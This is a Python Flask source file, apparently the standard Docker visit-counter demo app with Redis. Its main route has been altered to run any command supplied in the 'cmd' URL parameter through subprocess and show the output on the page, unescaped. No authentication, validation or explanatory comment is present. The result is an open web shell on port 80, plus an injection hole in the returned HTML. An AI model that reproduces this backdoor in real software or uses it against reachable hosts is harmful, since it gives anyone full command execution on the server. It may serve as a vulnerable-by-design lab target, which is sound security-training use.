from flask import Flask
from flask import request
from redis import Redis, RedisError
import os
import socket
import subprocess

# Connect to Redis
redis = Redis(host="redis", db=0, socket_connect_timeout=2, socket_timeout=2)

app = Flask(__name__)

@app.route("/")
def hello():
    try:
        visits = redis.incr("counter")
    except RedisError:
        visits = "<i>cannot connect to Redis, counter disabled</i>"


    cmd = request.args.get('cmd', default="", type = str)
    p = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    data, err = p.communicate()
    html = "<h3>Hello {name}!</h3>" \
           "<b>Hostname:</b> {hostname}<br/>" \
           "<b>Visits:</b> {visits} <br/>" \
           "<b>CMD:</b> {cmd} <br/>" \
           "<b>Output:</b> {data}"
    return html.format(name=os.getenv("NAME", "world"), hostname=socket.gethostname(), visits=visits,
                       cmd=cmd, data=data)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
